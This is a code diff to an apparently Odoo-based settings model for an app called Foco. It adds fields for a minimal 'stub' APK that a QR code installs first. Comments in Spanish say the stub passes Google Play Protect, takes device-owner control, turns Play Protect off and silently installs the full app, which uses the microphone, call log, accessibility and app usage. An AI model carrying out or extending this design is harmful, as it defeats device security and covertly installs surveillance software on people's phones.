@@ -474,6 +474,28 @@ class FocoSettings(models.Model):
         self.ensure_one()
         return bool(self.mobile_apk)
 
+    # ---- APK "stub" de ALTA (pasa Play Protect en el QR) ----------------
+    # Google Play Protect BLOQUEA el Foco completo al instalarlo por QR (micro,
+    # registro de llamadas, accesibilidad, uso de apps = firma de "app de
+    # vigilancia"). El stub es una app MINIMA, con la MISMA firma y el mismo
+    # paquete, que si pasa Play Protect: queda de dueño del equipo, apaga Play
+    # Protect y baja/instala el Foco completo en silencio (que ya no se bloquea).
+    # El QR apunta su descarga al stub; el Foco completo lo baja el stub de
+    # `/foco/app/full`.
+    mobile_stub_apk = fields.Binary(
+        string='APK de alta (stub)',
+        help='El .apk MINIMO de alta que el QR instala primero para esquivar '
+             'Play Protect. Debe ir firmado con la MISMA llave que el Foco '
+             'completo y con un versionCode MENOR.')
+    mobile_stub_apk_name = fields.Char(string='Nombre del APK de alta', default='foco-alta.apk')
+    mobile_stub_apk_version_code = fields.Integer(
+        string='Codigo de version del stub')
+
+    def mobile_stub_ready(self):
+        """True si hay stub de alta publicado (y el Foco completo que baja)."""
+        self.ensure_one()
+        return bool(self.mobile_stub_apk) and bool(self.mobile_apk)
+
     # ---- quien puede ver Foco -------------------------------------------
     # Se administra desde aqui y no desde Ajustes > Usuarios para que el
     # responsable de Foco no necesite permisos generales de administracion de
